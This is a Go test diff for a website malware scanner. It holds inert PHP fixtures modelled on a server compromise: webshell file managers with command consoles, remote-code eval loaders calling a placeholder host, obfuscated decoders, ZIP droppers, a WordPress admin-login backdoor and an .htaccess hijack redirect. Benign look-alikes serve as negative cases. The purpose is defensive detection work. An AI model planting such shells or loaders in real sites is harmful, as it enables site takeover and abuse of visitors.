@@ -2165,3 +2165,79 @@ func TestFleetRemoteEvalAndAlfaParts(t *testing.T) {
 		}
 	}
 }
+
+// The server-wide compromise of 2026-11-11 (server1.superfastcloudhosting):
+// shells dropped through a file manager plugin with stolen administrator
+// logins, gambling pages and .htaccess redirects. None had a finding. The
+// shapes are caught on any server now; the site's own files that look
+// alike stay clean. Inert fixtures.
+func TestFleetServerWideHack1111(t *testing.T) {
+	s := newScanner(t)
+	fm := "foreach (scandir($p = $_GET['path'] ?? '.') as $e) { echo $e; }\nif (isset($_GET['delete'])) { unlink($p . '/' . $_GET['delete']); }\n" +
+		"if (isset($_POST['new_folder'])) { mkdir($p . '/' . $_POST['new_folder']); }\nif (isset($_GET['rmdir'])) { rmdir($_GET['rmdir']); }\n" +
+		"if (isset($_POST['rename'])) { rename($_POST['from'], $_POST['rename']); }\nif (isset($_POST['file_content'])) { file_put_contents($_GET['edit'], $_POST['file_content']); }\n" +
+		"if (!empty($_FILES['f'])) { move_uploaded_file($_FILES['f']['tmp_name'], $p . '/' . basename($_FILES['f']['name'])); }\n"
+	login := "session_start(); if (($_POST['password'] ?? '') === 'inert') { $_SESSION['ok'] = 1; } if (empty($_SESSION['ok'])) { exit; }\n"
+	for what, c := range map[string]struct{ name, body, sig string }{
+		"names in base64": {"01.php", "<?php\n$FN_UL = base64_decode('dW5saW5r');\n$FN_RN = base64_decode('cmVuYW1l');\n$FN_FP = base64_decode('ZmlsZV9wdXRfY29udGVudHM=');\n" +
+			"if (isset($_POST['d'])) { $FN_UL($_POST['d']); }\nif (isset($_POST['r'])) { $FN_RN($_POST['r'], $_POST['t']); }\nif (isset($_POST['w'])) { $FN_FP($_POST['w'], base64_decode($_POST['c'])); }\n",
+			"PHP.Obfuscated.HiddenFunctionNames"},
+		"decoder from variables": {"04.php", "<?php\n$z = 'aW5l';\n$z .= 'cnQ=';\n$a = 'base';\n$b = '64_decode';\n$c = $a.$b;\n$string = $c($z);\neval($string);\n?>", "PHP.Obfuscated.HiddenDecoder"},
+		"eval of curl_exec":      {"bootstrap.inc.php", "<?php $ch= curl_init('https://example.test/inert.txt'); curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0,]); if(!empty($ch)) @eval('?>'.curl_exec($ch));", "PHP.Backdoor.RemoteCodeEval"},
+		"eval of a stream read": {"wp-admin/options-media.php", "<?php $u = 'https://example.test/inert.txt'; $x = stream_context_create(array('ssl' => array('verify_peer' => false)));\n" +
+			"$h = @fopen($u, 'r', false, $x); if ($h) { $d = ''; while (!feof($h)) { $d .= fread($h, 8192); } fclose($h); if (!empty($d)) { eval('?>' . $d); } }", "PHP.Backdoor.RemoteCodeEval"},
+		"xor eval":              {"css.php", "<?php $provider = 'inert-one'; $loader = 'inert-two'; eval('?>' . ($loader ^ $provider));", "PHP.Obfuscated.XorEval"},
+		"temp file loader":      {"editUsers.php", "<?php $r = $_COOKIE; $f = tempnam(sys_get_temp_dir(), 'x'); $p = '<?php ' . base64_decode(str_rot13($r[3])); $h = fopen($f, 'w'); fputs($h, $p); fclose($h); require_once($f); unlink($f);", "PHP.Dropper.TempIncludeLoader"},
+		"manager with console":  {"hmhfm.php", "<?php\n" + login + fm + "if (isset($_POST['cmd'])) { $run_cmd = $_POST['cmd']; $process = proc_open($run_cmd, [1 => ['pipe', 'w']], $pipes); }\n", "PHP.Webshell.FileManager"},
+		"manager without login": {"kl.php", "<?php\n" + fm, "PHP.Webshell.FileManager"},
+		"zip upload unpacked":   {"zip.php", "<?php if (isset($_FILES['zipfile'])) { $zip = new ZipArchive; if ($zip->open($_FILES['zipfile']['tmp_name']) === TRUE) { $zip->extractTo(rtrim($_POST['dir'], '/')); $zip->close(); } }", "PHP.Uploader.ZipExtract"},
+		"zip site deployer": {"setup.php", "<?php if (!hash_equals('inert', (string) ($_POST['key'] ?? ''))) { exit; }\n$up = $_FILES['bundle']; $zip = new ZipArchive(); $zip->open($up['tmp_name']);\n" +
+			"for ($i = 0; $i < $zip->numFiles; $i++) { file_put_contents(__DIR__ . '/' . $zip->getNameIndex($i), $zip->getFromIndex($i)); }\nfile_put_contents(__DIR__ . '/.htaccess', 'RewriteEngine On', FILE_APPEND);\n", "PHP.Dropper.ZipSiteDeployer"},
+		"wordpress login for anyone": {"wp-actions.php", "<?php require_once(dirname(__FILE__) . '/wp-load.php'); if (($_REQUEST['k'] ?? '') !== 'inert') { exit; } wp_set_auth_cookie(1); wp_redirect(admin_url());", "PHP.Backdoor.WPRemoteLogin"},
+		"self copying":               {"a.php", "<?php @touch(__FILE__, time()+315360000); foreach (['wp-check.php', 'a.php'] as $x) { if (!file_exists($x)) @copy(__FILE__, $x); } echo 'inert';", "PHP.Dropper.SelfReplicating"},
+		"eval of dynamic call":       {"moddofuns.php", "<?php $a = array_fill(0, 99, 'trim'); eval($a[70]($a[88]));", "PHP.Obfuscated.EvalDynamicCall"},
+		"site sent away":             {".htaccess", "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule ^wp-admin(?:/|$) - [L]\nRewriteRule ^wp-login\\.php$ - [L]\nRewriteRule ^wp-content(?:/|$) - [L]\nRewriteRule ^ https://inert.example.test/ [R=302,L]\n</IfModule>\n", "Htaccess.Hacked.SiteHijack"},
+		"gambling copy of a page": {"faqs/index.html", "<!DOCTYPE html><html><head><title>SURGA11 Game Online x FAQs - Kids Care</title>\n<meta name=\"description\" content=\"Informasi Slot Dana Ulasan Slot RTP Tinggi di Situs Slot Terbaru\">\n" +
+			strings.Repeat("<link rel=\"stylesheet\" href=\"/wp-content/themes/t/style.css\">\n", 6) + "</head><body>inert</body></html>", "HTML.SEOSpam.GamblingDoorway"},
+	} {
+		p := "/home2/u/public_html/" + c.name
+		d := s.checkContent(p, extOf(p), []byte(c.body))
+		if what == "manager with console" && d != nil && d.Signature == "PHP.Backdoor.CommandInjection" {
+			continue // its console alone is caught too
+		}
+		if d == nil || d.Signature != c.sig || d.Category != CatVirus {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+	// Cleaning the site's .htaccess drops the redirect, keeps WordPress.
+	hj := "RewriteEngine On\nRewriteRule ^wp-admin(?:/|$) - [L]\nRewriteRule ^ https://inert.example.test/ [R=302,L]\n# BEGIN WordPress\nRewriteRule . /index.php [L]\n# END WordPress\n"
+	if c := string(CleanHtaccess([]byte(hj), "/")); strings.Contains(c, "inert.example.test") || !strings.Contains(c, "index.php") {
+		t.Errorf("cleaned:\n%s", c)
+	}
+	// A manager with a login and no console: reported for a look only.
+	if d := s.checkContent("/home2/u/public_html/itu.php", ".php", []byte("<?php\n"+login+fm)); d == nil || d.Category != CatSuspicious {
+		t.Errorf("manager with login: %+v", d)
+	}
+	for what, c := range map[string]struct{ name, body string }{
+		// A site that moved names its old host and sends the admin too.
+		"moved site": {".htaccess", "RewriteEngine On\nRewriteCond %{HTTP_HOST} ^old\\.example\\.test$ [NC]\nRewriteRule ^(.*)$ https://new.example.test/$1 [R=301,L]\n"},
+		// Admin passed through, the redirect only for one old host.
+		"host redirect": {".htaccess", "RewriteEngine On\nRewriteRule ^wp-admin(?:/|$) - [L]\nRewriteCond %{HTTP_HOST} ^www\\.old\\.example\\.test$\nRewriteRule ^ https://example.test/ [R=301,L]\n"},
+		// A plugin that creates posts for editors.
+		"plugin poster": {"wp-content/plugins/p/p.php", "<?php\n/* Plugin Name: Poster */\nadd_action('admin_post_p', function () { if (!current_user_can('edit_posts')) { return; } wp_insert_post(['post_title' => sanitize_text_field($_POST['t'])]); });\n"},
+		// A page that loads WordPress and lists posts.
+		"wp page": {"latest.php", "<?php require __DIR__ . '/wp-load.php'; foreach (get_posts(['numberposts' => intval($_GET['n'] ?? 5)]) as $p) { echo esc_html($p->post_title); }\n"},
+		// Names kept in variables plainly.
+		"plain callbacks": {"lib/cb.php", "<?php $enc = base64_decode('aGVsbG8='); $cb = 'strtoupper'; echo $cb($enc); $f = 'file_put_contents'; $f('/tmp/x.txt', 'inert');\n"},
+		// A theme's ZIP import behind a capability check.
+		"theme import": {"wp-content/themes/t/import.php", "<?php if (!current_user_can('manage_options')) { exit; } $zip = new ZipArchive; if ($zip->open($_FILES['demo']['tmp_name']) === true) { $zip->extractTo(WP_CONTENT_DIR . '/uploads/demo'); $zip->close(); }\n"},
+		// A page that offers time slots.
+		"time slots": {"booking/index.html", "<!DOCTYPE html><html><head><title>Book a time slot - Clinic</title><meta name=\"description\" content=\"Choose a slot that suits you\">\n" +
+			strings.Repeat("<link rel=\"stylesheet\" href=\"/wp-content/themes/t/style.css\">\n", 6) + "</head><body>inert</body></html>"},
+	} {
+		p := "/home2/u/public_html/" + c.name
+		if d := s.checkContent(p, extOf(p), []byte(c.body)); d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
